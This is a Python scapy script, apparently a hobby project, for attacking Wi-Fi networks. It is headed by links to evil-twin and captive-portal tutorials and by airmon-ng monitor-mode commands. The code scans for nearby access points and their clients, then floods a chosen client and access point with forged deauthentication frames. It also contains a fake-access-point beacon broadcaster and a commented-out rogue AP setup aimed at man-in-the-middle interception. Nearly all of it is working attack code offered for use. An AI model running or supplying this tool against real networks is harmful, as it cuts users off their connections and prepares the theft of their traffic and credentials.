"""
Base Attac / ET / scpay packets
----------------------------------------------
https://www.thepythoncode.com/search?q=scapy
https://www.pentesteracademy.com/course?id=14
https://www.thepythoncode.com/article/create-fake-access-points-scapy
https://www.shellvoide.com/wifi/setting-up-fake-access-point-or-evil-twin-to-hack-wifi-rogue-ap/
https://www.shellvoide.com/wifi/fake-ap-how-to-create-an-evil-twin-karma-access-point/2222222221
-----------------------------
https://rootsh3ll.com/evil-twin-attack/
https://rootsh3ll.com/captive-portal-guide/

Send page to user / MITM / 3-way handsake
----------------------------------------------
https://pdfs.semanticscholar.org/7c29/497fe5551d6d0bfa1cb6ca5b14b5f6f3b29d.pdf
https://www.hackingloops.com/man-in-the-middle-python/
https://scapy.net/conf/scapy_hack.lu.pdf

iwconfig
airmon-ng check
airmon-ng check kill
airmon-ng start wlan0
iwconfig
airodump-ng wlan0mon

ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up


service network-manager restart


"""
import sys
import socket
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, RadioTap, Dot11Deauth
import pandas
from faker import Faker


# import pyaccesspoint

devices = set()

ADDR = 0
BSSID = 1
CHANNEL = 2

target_mac = ""
ap_list = []
ssids_set = set()
client_list = []
ethernet_name = 'eth0'
network_adapter = sys.argv[1]
search_timeout = int(sys.argv[2])
packets = 100
ap_to_attack = -1

networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)
stop_hopper = False
ssids = set()
client_probes = set()
hidden_ssid_aps = set()


def scan_netwroks(pkt):
    if pkt.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = pkt[Dot11].addr2
        # get the name of it
        ssid = pkt[Dot11Elt].info.decode()

        if ssid not in ssids_set:
            ssids_set.add(ssid)

            stats = pkt[Dot11Beacon].network_stats()
            # get the channel of the AP
            channel = stats.get("channel")

            ap_list.append([ssid, bssid, channel])
            print("AP: %s SSID: %s Channel: %d" % (bssid, ssid, channel))


def set_channel(channel):
    os.system('iwconfig %s channel %d' % (network_adapter, channel))


def attack(client_idx, network_name):
    global ap_to_attack
    print("attacking")
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC

    client_mac = client_list[client_idx]
    print("attaching client mac:", client_mac)
    # print("clinet mac to attack:", client_mac )
    # brdmac = "ff:ff:ff:ff:ff:ff"
    # pkt = RadioTap() / Dot11(addr1 = brdmac , addr2 = client_mac , addr3 = client_mac)/ Dot11Deauth()
    # sendp(pkt, iface=network_adapter , count=1000, inter = 0.2)

    for y in range(1,2):
        pkt1 = RadioTap() / Dot11(addr1=client_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()
        pkt2 = RadioTap() / Dot11(addr1=target_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth()
        for _ in range(30):
            print("sendppp" )
            sendp(pkt1, iface=network_adapter )
            sendp(pkt2, iface=network_adapter )
            if y % 30 == 0:
                press = input("press p to stop, otherwise any")
                if press == 'p':
                    print("#  Goodbye  #")
                    break
    # fake_AP(client_mac,network_name )
    # fake_AP(client_mac )
    # createAP(network_adapter, ap_list[ap_to_attack][CHANNEL], ap_list[ap_to_attack][ADDR] , ap_list[ap_to_attack][BSSID] )
    # createAP(network_adapter, ap_list[ap_to_attack][CHANNEL])


def createAP(interface, channel, ssid='Hotspot', ip='192.168.45.1', netmask='255.255.255.0'):
    print("In create AP")

    access_point = pyaccesspoint.AccessPoint('wlan0', ethernet_name, ip, netmask, ssid, channel)
    access_point.start()
    time.sleep(2)





def scan_clients(rmac, addr):
    global target_mac
    target_mac = rmac
    time = search_timeout * 2
    print("\nscanning clinet's mac:" ,rmac, "\tessid:" , addr ,  "\nscanning time:", time, "sec\n\nscanning...\n")
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    sniff(iface=network_adapter, prn=only_clients, timeout=time)
    print("\n----------- Clients Table ---------------------\n")
    for x in range(len(client_list)):
        print('[',x ,']', client_list[x])
    print("\n-----------------------------------------\n")
    result = input("Choose number to attack or type 'r' for rescan: ")
    if result == 'r':
        scan_clients(rmac , addr)
    elif result == 'q':
        return
    elif result.isnumeric():
        attack(int(result), addr)
    else:
        return




def only_clients(pkt):
    global client_list
    if (pkt.addr2 == target_mac or pkt.addr3 == target_mac) and \
            pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in client_list:
            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                client_list.append(pkt.addr1)
                print("Client mac:", pkt.addr1)

def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {network_adapter} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)

def showAPs():
    global  ap_to_attack
    print("welcome to Show APs")
    print("-------------------------\n")
    print("\nnetwork scanning time:" , search_timeout, "sec\nscanning...\n")
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    print("incoming APs:")
    print("--------------------------")
    sniff(iface=network_adapter, prn=scan_netwroks, timeout=search_timeout)
    num = len(ap_list)
    if num > 0: # has available networks
        print("\n----------- AP's Table ---------------------\n")
        for x in range(num):
            # print(x, ap_list[x][BSSID].decode(), ap_list[x][ADDR])
            print('[', x , ']', ap_list[x][BSSID], ap_list[x][ADDR])
        print("\n-----------------------------------------------------\n")

        ap_to_attack = int(input("Choose number to attack: "))
        # stop_hopper = True
        print("ch:", int(ap_list[ap_to_attack][CHANNEL]), end='\t')
        print("bssid:", ap_list[ap_to_attack][BSSID])
        set_channel(int(ap_list[ap_to_attack][CHANNEL]))
        scan_clients(ap_list[ap_to_attack][BSSID] , ap_list[ap_to_attack][ADDR])

    else: # didn't found
        rescan = input("----- Do you want to rescan ? y/n -----\n")
        if rescan == "y":
            showAPs()
        else:
            print("#  Goodbye  #")


def send_beacon(ssid, mac, client_mac ,infinite=True):
    # N: 30: 52:cb: ca:77: d8
    # Y:
    dot11 = Dot11(type=0, subtype=8,
                  addr1=client_mac,
                  addr2=mac, addr3=mac)
    # ESS+privacy to appear as secured on some devices
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, inter=0.1, loop=1, iface=network_adapter, verbose=0)
    print("fake AP data sent")



def fake_AP(client_mac, network_name = "TEST1") :
    print("start fake AP")
    # number of access points
    n_ap = 1
    iface = "wlan0mon"
    # generate random SSIDs and MACs
    faker = Faker()
    ssids_macs = [(network_name, faker.mac_address()) for i in range(n_ap)]
    for ssid, mac in ssids_macs:
        Thread(target=send_beacon, args=(ssid, mac, client_mac)).start()


def pick_action_type():
    action_type = input("press 1 for death attack\npress 2 for fake AP:\n")
    print()
    if action_type == '1':
        showAPs()
    # elif action_type == '2':
    #     # fake_AP()
    #     pass
    else:
        pick_action_type()



if __name__ == "__main__":
    pick_action_type()
